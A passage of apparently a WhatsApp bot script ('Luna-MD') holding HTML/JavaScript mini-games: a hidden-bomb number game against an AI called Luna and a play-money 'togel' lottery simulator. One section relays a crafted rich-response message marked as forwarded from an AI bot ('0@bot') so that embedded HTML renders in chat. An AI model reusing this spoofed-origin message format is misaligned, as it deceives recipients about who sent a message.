  const gridEl = document.getElementById('numberGrid');
  const scoreSpan = document.getElementById('scoreDisplay');
  const msgBox = document.getElementById('messageBox');
  const resetBtn = document.getElementById('resetBtn');
  const hintText = document.getElementById('hintText');
  const levelBtns = document.querySelectorAll('.level-btn');

  const LEVEL_INFO = {
    easy:   { name: 'EASY',   desc: '👶 Luna polos · pilih random',        aiSkill: 0.0  },
    medium: { name: 'MEDIUM', desc: '🧠 Luna sedang · 30% menghindar',     aiSkill: 0.3  },
    hard:   { name: 'HARD',   desc: '🔥 Luna pintar · 60% menghindar',     aiSkill: 0.6  },
    master: { name: 'MASTER', desc: '👑 Luna jenius · 90% menghindar',     aiSkill: 0.9  }
  };

  function initAudio() {
    if (!audioCtx) {
      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    }
  }

  function playTone(freq, dur, vol) {
    try {
      initAudio();
      const o = audioCtx.createOscillator();
      const g = audioCtx.createGain();
      o.type = 'sine';
      o.frequency.value = freq;
      g.gain.value = vol;
      g.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + dur / 1000);
      o.connect(g);
      g.connect(audioCtx.destination);
      o.start();
      o.stop(audioCtx.currentTime + dur / 1000);
    } catch (e) {}
  }

  function playSafeYou() { playTone(620, 80, 0.10); }
  function playSafeAI()  { playTone(420, 80, 0.08); }
  function playBoom() {
    playTone(180, 350, 0.20);
    setTimeout(function(){ playTone(130, 300, 0.15); }, 120);
  }
  function playWin() {
    playTone(780, 100, 0.12);
    setTimeout(function(){ playTone(980, 100, 0.12); }, 110);
    setTimeout(function(){ playTone(1180, 140, 0.12); }, 220);
  }
  function playClick() { playTone(500, 50, 0.06); }

  function setMsg(text, cls) {
    msgBox.textContent = text;
    msgBox.className = 'msg-box' + (cls ? ' ' + cls : '');
  }

  function updateScore() {
    scoreSpan.textContent = '🧑 ' + scoreYou + ' - ' + scoreAI + ' 🤖';
  }

  function emptyCells() {
    const arr = [];
    for (let i = 0; i < TOTAL; i++) {
      if (!revealed[i]) arr.push(i);
    }
    return arr;
  }

  function startGame() {
    boomIndex = Math.floor(Math.random() * TOTAL);
    revealed = new Array(TOTAL).fill(false);
    owner = new Array(TOTAL).fill(null);
    gameOver = false;
    busy = false;
    yourTurn = true;
    updateScore();
    setMsg('🎮 Giliran KAMU — pilih angka!', 'you');
    hintText.textContent = '👆 kamu vs Luna · 1 BOOM tersembunyi';
    renderGrid();
  }

  function renderGrid() {
    gridEl.innerHTML = '';

    for (let i = 0; i < TOTAL; i++) {
      (function (idx) {
        const btn = document.createElement('div');
        btn.className = 'num-btn';

        if (revealed[idx]) {
          if (idx === boomIndex) {
            btn.classList.add('boom');
            btn.textContent = '💥';
          } else if (owner[idx] === 'ai') {
            btn.classList.add('ai');
            btn.textContent = '🤖';
          } else {
            btn.classList.add('revealed');
            btn.textContent = '✅';
          }
          btn.classList.add('disabled');
        } else {
          if (gameOver) {
            btn.classList.add('disabled');
            if (idx === boomIndex) {
              btn.classList.add('boom');
              btn.textContent = '💥';
            } else {
              btn.classList.add('hidden');
              btn.textContent = '?';
            }
          } else {
            btn.textContent = '?';
            btn.classList.add('selected');
          }
        }

        btn.addEventListener('click', function (e) { handleClick(e, idx); });
        btn.addEventListener('touchstart', function (e) {
          e.preventDefault();
          handleClick(e, idx);
        }, { passive: false });

        gridEl.appendChild(btn);
      })(i);
    }
  }

  function handleClick(e, idx) {
    e.stopPropagation();
    e.preventDefault();
    if (gameOver || busy || !yourTurn || revealed[idx]) return;

    initAudio();
    yourTurn = false;
    busy = true;

    if (idx === boomIndex) {
      revealed[idx] = true;
      owner[idx] = 'you';
      gameOver = true;
      busy = false;
      playBoom();
      scoreAI++;
      updateScore();
      setMsg('💥 Kamu kena BOOM! Luna menang!', 'boom');
      renderGrid();
      return;
    }

    revealed[idx] = true;
    owner[idx] = 'you';
    playSafeYou();
    setMsg('✅ Aman! Giliran Luna...', 'you');
    renderGrid();

    const delay = level === 'master' ? 500 : level === 'hard' ? 700 : 900;
    setTimeout(aiMove, delay + Math.random() * 400);
  }

  function aiMove() {
    if (gameOver) { busy = false; return; }

    const empty = emptyCells();
    if (empty.length === 0) { busy = false; return; }

    const skill = LEVEL_INFO[level].aiSkill;
    let pick;
   
    if (Math.random() < skill && empty.length > 1) {
      const safeSkip = [];
      const shuffled = empty.slice().sort(function () { return Math.random() - 0.5; });
      const skipCount = Math.min(Math.floor(skill * 3), empty.length - 1);
      for (let i = 0; i < skipCount; i++) safeSkip.push(shuffled[i]);
      const candidates = empty.filter(function (i) { return safeSkip.indexOf(i) === -1; });
      pick = candidates[Math.floor(Math.random() * candidates.length)];
    } else {
      pick = empty[Math.floor(Math.random() * empty.length)];
    }

    if (pick === boomIndex) {
      revealed[pick] = true;
      owner[pick] = 'ai';
      gameOver = true;
      busy = false;
      playBoom();
      scoreYou++;
      updateScore();
      setMsg('💥 Luna kena BOOM! KAMU MENANG!', 'boom');
      playWin();
      renderGrid();
      return;
    }

    revealed[pick] = true;
    owner[pick] = 'ai';
    playSafeAI();
    yourTurn = true;
    busy = false;
    setMsg('🎮 Giliran KAMU — pilih angka!', 'you');
    renderGrid();
  }

  levelBtns.forEach(function (btn) {
    btn.addEventListener('click', function () {
      level = btn.dataset.level;
      levelBtns.forEach(function (b) { b.classList.remove('active'); });
      btn.classList.add('active');
      playClick();
      scoreYou = 0;
      scoreAI = 0;
      hintText.textContent = LEVEL_INFO[level].desc;
      startGame();
    });
  });

  resetBtn.addEventListener('click', function () { startGame(); });

  startGame();
})();
</script>

</body>
</html>
    `;
    
const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: html,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
)
}
break

case "tebakangka":
case "togel": {
const html = String.raw`
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Whisper · Togel Kocok vs Luna</title>
<style>
  * { box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }
  html, body { height: 100%; margin: 0; }
  body {
    background: radial-gradient(circle at 50% 0%, #2f1a1a 0%, #0d0f1a 70%);
    display: flex; justify-content: center; align-items: flex-start;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
    touch-action: manipulation; padding: 6px;
  }
  .wrapper {
    background: linear-gradient(145deg, #2f1a1a, #1a0f0f);
    padding: 1.5rem 0.9rem 1rem; border-radius: 1.6rem;
    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8), inset 0 0 0 2px #7a3a3a;
    border: 3px solid #5a2a2a; max-width: 400px; width: 100%;
    position: relative; margin-top: 12px;
  }
  .wrapper::before {
    content: '🎰 T O G E L  K O C O K';
    position: absolute; top: -12px; left: 50%; transform: translateX(-50%);
    background: #2f1a1a; color: #ffd166; padding: 3px 12px;
    font-size: 0.6rem; letter-spacing: 2px; border-radius: 30px;
    border: 2px solid #8a4a4a; text-shadow: 0 0 12px #ffd166;
    font-weight: bold; white-space: nowrap;
  }
  .level-bar { display: grid; grid-template-columns: repeat(3, 1fr); gap: 5px; margin-bottom: 0.6rem; }
  .level-btn {
    background: #1a0f0f; color: #8a6a6a; border: 2px solid #4a2a2a;
    border-radius: 8px; font-size: 0.62rem; font-weight: bold;
    padding: 0.45rem 0.1rem; cursor: pointer; transition: 0.1s;
    font-family: inherit; letter-spacing: 0.5px; text-align: center; line-height: 1.3;
  }
  .level-btn:active { transform: scale(0.95); }
  .level-btn.active { background: #7a2a2a; color: #ffd0d0; border-color: #ff5a5a; box-shadow: 0 0 12px rgba(255, 90, 90, 0.6); text-shadow: 0 0 6px #ff5a5a; }
  .level-btn[data-level="2d"].active { background: #1a3a4a; border-color: #4ac8ff; color: #b0e0ff; box-shadow: 0 0 10px rgba(74, 200, 255, 0.5); }
  .level-btn[data-level="3d"].active { background: #4a3a1a; border-color: #ffd166; color: #ffe9b0; box-shadow: 0 0 10px rgba(255, 209, 102, 0.5); }
  .level-btn[data-level="4d"].active { background: #4a1a2a; border-color: #ff4a7a; color: #ffb0c8; box-shadow: 0 0 10px rgba(255, 74, 122, 0.5); }

  .rate-bar {
    background: #0a0614; border-radius: 10px; padding: 6px 8px;
    border: 1.5px solid #4a2a2a; margin-bottom: 0.6rem;
    font-size: 0.55rem; color: #8a6a6a; text-align: center;
    letter-spacing: 0.5px; font-weight: bold;
    line-height: 1.5;
  }
  .rate-bar b { color: #ffd166; text-shadow: 0 0 5px #ffd166; }

  .step-bar { display: flex; justify-content: space-between; gap: 4px; margin-bottom: 0.6rem; }
  .step {
    flex: 1; text-align: center; font-size: 0.48rem; font-weight: bold;
    letter-spacing: 0.5px; text-transform: uppercase; padding: 5px 2px;
    border-radius: 6px; background: #1a0f0f; color: #6a5a5a;
    border: 1.5px solid #3a2a2a; transition: 0.2s;
  }
  .step.active { background: #7a2a2a; color: #ffd0d0; border-color: #ff5a5a; box-shadow: 0 0 8px rgba(255, 90, 90, 0.5); }
  .step.done { background: #1a3a1a; color: #b0ffb0; border-color: #4aff6a; box-shadow: 0 0 8px rgba(74, 255, 106, 0.4); }

  .arena {
    background: #0a0614; border-radius: 18px; padding: 1rem 0.7rem;
    box-shadow: inset 0 0 0 2px #5a2a2a, 0 6px 12px rgba(0, 0, 0, 0.6);
    margin-bottom: 0.7rem; text-align: center;
    position: relative; overflow: hidden;
  }
  .arena::before {
    content: ''; position: absolute; inset: 0;
    background: radial-gradient(circle at 50% 50%, rgba(255, 209, 102, 0.08) 0%, transparent 60%);
    pointer-events: none;
  }
  .result-label { color: #8a6a6a; font-size: 0.55rem; letter-spacing: 2px; text-transform: uppercase; font-weight: bold; margin-bottom: 8px; }
  .result-box { display: flex; justify-content: center; gap: 5px; margin-bottom: 10px; }
  .digit {
    width: 46px; height: 60px;
    background: linear-gradient(145deg, #2a0f0f, #1a0808);
    border: 2px solid #8a4a4a; border-radius: 10px;
    display: flex; align-items: center; justify-content: center;
    font-size: 1.9rem; font-weight: 900; color: #ffd166;
    text-shadow: 0 0 15px #ffd166, 0 0 30px rgba(255, 209, 102, 0.5);
    font-family: 'Courier New', monospace;
    box-shadow: inset 0 -6px 0 rgba(0,0,0,0.5), 0 0 15px rgba(255, 90, 90, 0.3);
    position: relative; overflow: hidden;
  }
  .digit.spinning { animation: spin 0.08s infinite; color: #ff8a8a; text-shadow: 0 0 15px #ff5a5a; }
  @keyframes spin { 0%, 100% { transform: translateY(-3px); } 50% { transform: translateY(3px); } }
  .digit.final {
    animation: popFinal 0.5s ease; border-color: #4aff6a; color: #b0ffb0;
    text-shadow: 0 0 20px #4aff6a, 0 0 40px #4aff6a;
    box-shadow: inset 0 -6px 0 rgba(0,0,0,0.5), 0 0 25px #4aff6a, 0 0 50px rgba(74, 255, 106, 0.5);
  }
  @keyframes popFinal { 0% { transform: scale(1); } 50% { transform: scale(1.2); } 100% { transform: scale(1); } }

  .vs-row { display: grid; grid-template-columns: 1fr auto 1fr; gap: 8px; align-items: center; }
  .side-label { color: #8a6a6a; font-size: 0.55rem; letter-spacing: 1.5px; text-transform: uppercase; font-weight: bold; padding: 4px 0; }
  .side-label.you { color: #4aff6a; text-shadow: 0 0 8px #4aff6a; }
  .side-label.ai  { color: #a07aff; text-shadow: 0 0 8px #a07aff; }
  .pick { font-size: 1.3rem; font-weight: 900; letter-spacing: 3px; font-family: 'Courier New', monospace; min-height: 1.6rem; color: #fff; text-shadow: 0 0 10px currentColor; }
  .pick.you { color: #4aff6a; text-shadow: 0 0 10px #4aff6a; }
  .pick.ai  { color: #a07aff; text-shadow: 0 0 10px #a07aff; }
  .pick.win { color: #ffd166 !important; text-shadow: 0 0 15px #ffd166, 0 0 30px #ffd166 !important; animation: winPulse 0.5s infinite alternate; }
  @keyframes winPulse { from { transform: scale(1); } to { transform: scale(1.12); } }
  .vs-badge {
    font-size: 1.1rem; font-weight: 900; color: #ffd166;
    text-shadow: 0 0 10px #ffd166; background: #0a0614;
    border: 2px solid #8a4a4a; border-radius: 50%;
    width: 34px; height: 34px; display: flex; align-items: center; justify-content: center;
  }

  .status-panel { display: grid; grid-template-columns: repeat(4, 1fr); gap: 5px; margin-bottom: 0.7rem; }
  .stat-box {
    background: #0a0614; color: #b0c8ff; font-size: 0.55rem; font-weight: bold;
    padding: 0.35rem 0.25rem; border-radius: 10px; border: 2px solid #4a2a2a;
    box-shadow: inset 0 -2px 0 #1a0f0f; text-align: center; white-space: nowrap;
  }
  .stat-box span { display: block; color: #8a6a6a; font-size: 0.45rem; letter-spacing: 0.6px; text-transform: uppercase; margin-bottom: 2px; }
  .stat-box b { color: #ffd166; text-shadow: 0 0 8px #ffd166; font-size: 0.8rem; }
  .stat-box b.green { color: #4aff6a; text-shadow: 0 0 8px #4aff6a; }
  .stat-box b.red   { color: #ff5a5a; text-shadow: 0 0 8px #ff5a5a; }
  .stat-box b.gold  { color: #ffd166; text-shadow: 0 0 8px #ffd166; }
  .stat-box b.flash { animation: moneyFlash 0.4s; }
  @keyframes moneyFlash { 0% { transform: scale(1); color: #ffd166; } 50% { transform: scale(1.3); color: #4aff6a; } 100% { transform: scale(1); color: #ffd166; } }

  .input-area { display: grid; grid-template-columns: 1fr auto; gap: 6px; margin-bottom: 0.6rem; }
  .guess-input {
    background: #0a0614; color: #ffd166; border: 2px solid #4a2a2a;
    border-radius: 12px; font-size: 1.1rem; font-weight: 900;
    text-align: center; padding: 0.55rem 0.5rem;
    font-family: 'Courier New', monospace; letter-spacing: 4px;
    outline: none; box-shadow: inset 0 -3px 0 #1a0f0f; transition: 0.15s; width: 100%;
  }
  .guess-input:focus { border-color: #ffd166; box-shadow: inset 0 -3px 0 #1a0f0f, 0 0 15px rgba(255, 209, 102, 0.5); text-shadow: 0 0 8px #ffd166; }
  .guess-input.shake { animation: shake 0.3s; border-color: #ff5a5a; }
  @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-6px); } 50% { transform: translateX(6px); } 75% { transform: translateX(-4px); } }

  .btn {
    background: linear-gradient(145deg, #7a2a2a, #4a1a1a);
    color: #ffd0d0; border: 2px solid #ff5a5a;
    font-size: 0.75rem; font-weight: bold; letter-spacing: 1.5px;
    padding: 0.55rem 1rem; border-radius: 12px;
    box-shadow: inset 0 -5px 0 #1a0f0f, 0 3px 0 #0a0614, 0 0 15px rgba(255, 90, 90, 0.3);
    cursor: pointer; transition: 0.06s linear;
    font-family: inherit; text-shadow: 0 0 8px #ff5a5a; white-space: nowrap;
  }
  .btn:active { transform: translateY(3px); box-shadow: inset 0 -2px 0 #1a0f0f, 0 0 0 #0a0614; }
  .btn:disabled { opacity: 0.4; pointer-events: none; }

  .btn.kocok {
    background: linear-gradient(145deg, #7a5a1a, #4a3a0f);
    border-color: #ffd166; color: #ffe9b0; text-shadow: 0 0 8px #ffd166;
    width: 100%; margin-top: 6px; font-size: 0.85rem; letter-spacing: 2px;
    display: none; animation: kocokPulse 1.2s infinite alternate;
  }
  .btn.kocok.show { display: block; }
  @keyframes kocokPulse {
    from { box-shadow: inset 0 -5px 0 #1a0f0f, 0 3px 0 #0a0614, 0 0 10px rgba(255, 209, 102, 0.3); }
    to   { box-shadow: inset 0 -5px 0 #1a0f0f, 0 3px 0 #0a0614, 0 0 25px rgba(255, 209, 102, 0.7); }
  }
  .btn.reset {
    background: linear-gradient(145deg, #2a3a4a, #1a2a3a);
    border-color: #4a6a8a; color: #b0c8ff; text-shadow: 0 0 6px #6f8fcf;
    width: 100%; margin-top: 6px; display: none;
  }
  .btn.reset.show { display: block; }

  .msg-box {
    text-align: center; font-size: 0.75rem; color: #b0c8ff;
    min-height: 1.4rem; padding: 0.5rem 0.2rem 0.2rem;
    text-shadow: 0 0 8px #4f6faf; font-weight: bold; line-height: 1.35;
  }
  .msg-box.win   { color: #b0ffb0; text-shadow: 0 0 12px #4aff6a, 0 0 24px #4aff6a; }
  .msg-box.lose  { color: #ffb0b0; text-shadow: 0 0 12px #ff5a5a; }
  .msg-box.info  { color: #ffd166; text-shadow: 0 0 10px #ffd166; }
  .msg-box.jackpot { color: #ffd166; text-shadow: 0 0 15px #ffd166, 0 0 30px #ff8a4a; animation: winPulse 0.4s infinite alternate; }

  .hint { color: #6a5a5a; text-align: center; margin-top: 8px; font-size: 0.55rem; letter-spacing: 1px; opacity: 0.75; }

  .modal {
    position: fixed; inset: 0; z-index: 30; display: none;
    align-items: center; justify-content: center; padding: 15px;
    background: rgba(9, 6, 6, 0.85); backdrop-filter: blur(4px);
  }
  .modal.show { display: flex; }
  .modal-box {
    width: min(90vw, 340px); padding: 22px 18px;
    border: 2px solid #8a4a4a; border-radius: 20px;
    background: linear-gradient(145deg, #3a1a1a, #1a0f0f);
    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9), 0 0 40px rgba(255, 90, 90, 0.3);
    text-align: center;
  }
  .modal-icon { font-size: 3rem; margin-bottom: 6px; animation: popFinal 0.5s ease; }
  .modal-title { font-size: 1.4rem; font-weight: 900; color: #ff5a5a; text-shadow: 0 0 15px #ff5a5a; margin: 4px 0 10px; letter-spacing: 2px; }
  .modal-text { font-size: 0.85rem; color: #c8b0b0; line-height: 1.5; margin-bottom: 14px; }
  .modal-stats {
    display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 14px;
  }
  .modal-stats div {
    padding: 8px 4px; border: 1.5px solid #4a2a2a; border-radius: 10px;
    background: #0a0614;
  }
  .modal-stats b { display: block; font-size: 1.05rem; color: #ffd166; text-shadow: 0 0 8px #ffd166; }
  .modal-stats span { font-size: 0.5rem; color: #8a6a6a; text-transform: uppercase; letter-spacing: 1px; }
  .modal-btn {
    width: 100%; background: linear-gradient(145deg, #4a3a1a, #2a1a0a);
    border: 2px solid #ffd166; color: #ffe9b0;
    font-size: 0.9rem; font-weight: bold; letter-spacing: 2px;
    padding: 0.7rem 1rem; border-radius: 12px;
    box-shadow: inset 0 -5px 0 #0a0614, 0 3px 0 #0a0614;
    cursor: pointer; font-family: inherit; text-shadow: 0 0 8px #ffd166;
  }
  .modal-btn:active { transform: translateY(3px); box-shadow: inset 0 -2px 0 #0a0614; }
</style>
</head>
<body>

<div class="wrapper">
  <div class="level-bar">
    <button class="level-btn" data-level="2d">2D<br>00-99</button>
    <button class="level-btn active" data-level="3d">3D<br>000-999</button>
    <button class="level-btn" data-level="4d">4D<br>0000-9999</button>
  </div>

  <div class="rate-bar" id="rateBar">
    💰 Taruhan <b>10</b> · 3D persis = <b>+4.000</b>
  </div>

  <div class="step-bar">
    <div class="step active" id="step1">1. PASANG</div>
    <div class="step" id="step2">2. KUNCI</div>
    <div class="step" id="step3">3. KOCOK</div>
  </div>

  <div class="arena">
    <div class="result-label">🎲 Angka Keluar</div>
    <div class="result-box" id="resultBox">
      <div class="digit" id="d1">-</div>
      <div class="digit" id="d2">-</div>
      <div class="digit" id="d3">-</div>
      <div class="digit" id="d4">-</div>
    </div>

    <div class="vs-row">
      <div>
        <div class="side-label you">KAMU</div>
        <div class="pick you" id="pickYou">--</div>
      </div>
      <div class="vs-badge">VS</div>
      <div>
        <div class="side-label ai">Luna</div>
        <div class="pick ai" id="pickAI">--</div>
      </div>
    </div>
  </div>

  <div class="status-panel">
    <div class="stat-box"><span>Ronde</span><b id="roundEl">0</b></div>
    <div class="stat-box"><span>Kamu</span><b class="green" id="winsYou">0</b></div>
    <div class="stat-box"><span>Luna</span><b class="red" id="winsAI">0</b></div>
    <div class="stat-box"><span>💰 Duit</span><b class="gold" id="moneyEl">1000</b></div>
  </div>

  <div class="input-area">
    <input type="text" class="guess-input" id="guessInput" placeholder="000" inputmode="numeric" autocomplete="off" maxlength="4">
    <button class="btn" id="playBtn">PASANG</button>
  </div>

  <button class="btn kocok" id="kocokBtn">🎰 KOCOK ANGKA</button>
  <button class="btn reset" id="resetBtn">🔄 RONDE BARU</button>

  <div class="msg-box info" id="msgBox">💡 Pilih mode, pasang angka PERSIS, lalu KOCOK!</div>
  <div class="hint">🎯 Angka harus SAMA PERSIS untuk menang</div>
</div>

<div class="modal" id="modal">
  <div class="modal-box">
    <div class="modal-icon" id="modalIcon">💀</div>
    <div class="modal-title" id="modalTitle">BANGKRUT!</div>
    <div class="modal-text" id="modalText">Duit kamu habis. Mau main lagi?</div>
    <div class="modal-stats">
      <div><b id="mRonde">0</b><span>Ronde</span></div>
      <div><b id="mMenang">0</b><span>Menang</span></div>
      <div><b id="mKalah">0</b><span>Kalah</span></div>
    </div>
    <button class="modal-btn" id="modalBtn">🔄 MAIN LAGI · 1000 DUIT</button>
  </div>
</div>

<script>
(function () {
  const MODES = {
    '2d': { digits: 2, rate: 70,   label: '2D', hadiah: 'x70',   min: 0, max: 99   },
    '3d': { digits: 3, rate: 400,  label: '3D', hadiah: 'x400',  min: 0, max: 999  },
    '4d': { digits: 4, rate: 3000, label: '4D', hadiah: 'x3000', min: 0, max: 9999 }
  };

  const TARUHAN = 10;

  let mode = '3d';
  let round = 0;
  let winsYou = 0;
  let winsAI = 0;
  let money = 1000;
  let yourPick = null;
  let aiPick = null;
  let finalNumber = null;
  let phase = 'input';
  let busy = false;
  let audioCtx = null;

  const digits = [
    document.getElementById('d1'),
    document.getElementById('d2'),
    document.getElementById('d3'),
    document.getElementById('d4')
  ];
  const pickYouEl  = document.getElementById('pickYou');
  const pickAIEl   = document.getElementById('pickAI');
  const roundEl    = document.getElementById('roundEl');
  const winsYouEl  = document.getElementById('winsYou');
  const winsAIEl   = document.getElementById('winsAI');
  const moneyEl    = document.getElementById('moneyEl');
  const guessInput = document.getElementById('guessInput');
  const playBtn    = document.getElementById('playBtn');
  const kocokBtn   = document.getElementById('kocokBtn');
  const resetBtn   = document.getElementById('resetBtn');
  const msgBox     = document.getElementById('msgBox');
  const rateBar    = document.getElementById('rateBar');
  const step1      = document.getElementById('step1');
  const step2      = document.getElementById('step2');
  const step3      = document.getElementById('step3');
  const levelBtns  = document.querySelectorAll('.level-btn');
  const modal      = document.getElementById('modal');
  const modalIcon  = document.getElementById('modalIcon');
  const modalTitle = document.getElementById('modalTitle');
  const modalText  = document.getElementById('modalText');
  const mRonde     = document.getElementById('mRonde');
  const mMenang    = document.getElementById('mMenang');
  const mKalah     = document.getElementById('mKalah');
  const modalBtn   = document.getElementById('modalBtn');

  function initAudio() { if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)(); }
  function playTone(freq, dur, vol, type) {
    try {
      initAudio();
      const o = audioCtx.createOscillator(), g = audioCtx.createGain();
      o.type = type || 'sine'; o.frequency.value = freq;
      g.gain.value = vol;
      g.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + dur / 1000);
      o.connect(g); g.connect(audioCtx.destination);
      o.start(); o.stop(audioCtx.currentTime + dur / 1000);
    } catch (e) {}
  }
  function playTick()  { playTone(800 + Math.random() * 400, 30, 0.04, 'square'); }
  function playSpin()  { playTone(200, 80, 0.06, 'sawtooth'); }
  function playLock()  { playTone(660, 80, 0.10); setTimeout(() => playTone(880, 120, 0.10), 100); }
  function playWin()   { playTone(780, 100, 0.12); setTimeout(() => playTone(980, 100, 0.12), 110); setTimeout(() => playTone(1180, 140, 0.12), 220); }
  function playJackpot() { playTone(880, 100, 0.14); setTimeout(() => playTone(1180, 100, 0.14), 110); setTimeout(() => playTone(1480, 150, 0.14), 220); setTimeout(() => playTone(1760, 200, 0.14), 360); }
  function playLose()  { playTone(300, 200, 0.10, 'sawtooth'); setTimeout(() => playTone(200, 250, 0.10, 'sawtooth'), 150); }
  function playClick() { playTone(520, 50, 0.06); }

  function setMsg(text, cls) { msgBox.textContent = text; msgBox.className = 'msg-box' + (cls ? ' ' + cls : ''); }
  function pad(n, len) { return String(n).padStart(len, '0'); }

  function setStep(n) {
    [step1, step2, step3].forEach((s, i) => {
      s.classList.remove('active', 'done');
      if (i + 1 < n) s.classList.add('done');
      else if (i + 1 === n) s.classList.add('active');
    });
  }

  function updateRateBar() {
    const cfg = MODES[mode];
    rateBar.innerHTML = '💰 Taruhan <b>' + TARUHAN + '</b> · ' + cfg.label + ' persis = <b>+' + (TARUHAN * cfg.rate) + '</b>';
  }

  function updateVisibleDigits() {
    const cfg = MODES[mode];
    for (let i = 0; i < 4; i++) {
      digits[i].style.display = i < cfg.digits ? 'flex' : 'none';
    }
    guessInput.maxLength = cfg.digits;
    guessInput.placeholder = pad(0, cfg.digits);
  }

  function resetDigits() {
    const cfg = MODES[mode];
    for (let i = 0; i < 4; i++) {
      digits[i].textContent = '-';
      digits[i].classList.remove('spinning', 'final');
    }
  }

  function updateStats() {
    roundEl.textContent = round;
    winsYouEl.textContent = winsYou;
    winsAIEl.textContent = winsAI;
    moneyEl.textContent = money;
  }

  function flashMoney() {
    moneyEl.classList.remove('flash');
    void moneyEl.offsetWidth;
    moneyEl.classList.add('flash');
  }

  function updatePicks() {
    pickYouEl.textContent = yourPick !== null ? pad(yourPick, MODES[mode].digits) : '--';
    pickAIEl.textContent  = aiPick !== null ? pad(aiPick, MODES[mode].digits) : '--';
    pickYouEl.classList.remove('win');
    pickAIEl.classList.remove('win');
  }

    function startGame() {
    updateVisibleDigits();
    updateRateBar();
    resetDigits();
    updateStats();
    updatePicks();
    guessInput.value = '';
    guessInput.disabled = false;
    playBtn.disabled = false;
    playBtn.style.display = '';
    kocokBtn.classList.remove('show');
    kocokBtn.disabled = false;
    resetBtn.classList.remove('show');
    phase = 'input';
    busy = false;
    yourPick = null;
    aiPick = null;
    finalNumber = null;
    setStep(1);
    setMsg('💡 Pasang ' + MODES[mode].label + ' (' + MODES[mode].digits + ' digit)!', 'info');
  }

  function resetRound() {
    resetDigits();
    guessInput.value = '';
    guessInput.disabled = false;
    playBtn.disabled = false;
    playBtn.style.display = '';
    kocokBtn.classList.remove('show');
    kocokBtn.disabled = false;
    resetBtn.classList.remove('show');
    phase = 'input';
    busy = false;
    yourPick = null;
    aiPick = null;
    finalNumber = null;
    updatePicks();
    setStep(1);
    setMsg('💡 Pasang angka PERSIS untuk ronde berikutnya!', 'info');
    guessInput.focus();
  }

  function handlePlay() {
    if (phase !== 'input' || busy) return;
    const cfg = MODES[mode];
    const raw = guessInput.value.trim();

    if (raw === '' || !/^\d+$/.test(raw)) {
      guessInput.classList.add('shake');
      setTimeout(() => guessInput.classList.remove('shake'), 320);
      setMsg('⚠️ Masukkan angka dulu!', 'lose');
      return;
    }

    if (raw.length !== cfg.digits) {
      guessInput.classList.add('shake');
      setTimeout(() => guessInput.classList.remove('shake'), 320);
      setMsg('⚠️ Harus ' + cfg.digits + ' digit!', 'lose');
      return;
    }

    const val = parseInt(raw, 10);

    if (money < TARUHAN) {
      showBankrupt();
      return;
    }

    initAudio();
    playLock();

    yourPick = val;
    const aiMax = Math.pow(10, cfg.digits) - 1;
    aiPick = Math.floor(Math.random() * (aiMax + 1));

    money -= TARUHAN;
    updateStats();
    flashMoney();
    updatePicks();

    guessInput.disabled = true;
    playBtn.disabled = true;
    kocokBtn.classList.add('show');
    phase = 'locked';
    setStep(2);

    setMsg('🔒 Taruhan ' + TARUHAN + ' duit · Tekan KOCOK!', 'info');
  }

  function kocok() {
    if (phase !== 'locked' || busy) return;
    phase = 'spinning';
    busy = true;
    kocokBtn.disabled = true;
    setStep(3);

    initAudio();
    playSpin();

    const cfg = MODES[mode];
    const maxNum = Math.pow(10, cfg.digits) - 1;
    finalNumber = Math.floor(Math.random() * (maxNum + 1));
    const finalDigits = pad(finalNumber, cfg.digits).split('');

    for (let i = 0; i < cfg.digits; i++) {
      digits[i].classList.add('spinning');
      digits[i].classList.remove('final');
    }

    const tickInt = setInterval(playTick, 80);
    const spinInt = setInterval(() => {
      for (let i = 0; i < cfg.digits; i++) digits[i].textContent = Math.floor(Math.random() * 10);
    }, 60);

    setTimeout(() => {
      clearInterval(tickInt);
      clearInterval(spinInt);

      for (let i = 0; i < cfg.digits; i++) {
        setTimeout(() => {
          digits[i].classList.remove('spinning');
          digits[i].classList.add('final');
          digits[i].textContent = finalDigits[i];
          playTick();
        }, i * 220);
      }

      setTimeout(() => {
        phase = 'result';
        busy = false;
        evaluateRound();
      }, cfg.digits * 220 + 300);
    }, 1800);
  }

  function evaluateRound() {
    round++;
    const cfg = MODES[mode];

    const youWin = yourPick === finalNumber;
    const aiWin  = aiPick === finalNumber;

    let text = '', cls = '';

    if (youWin) {
      const reward = TARUHAN * cfg.rate;
      money += reward;
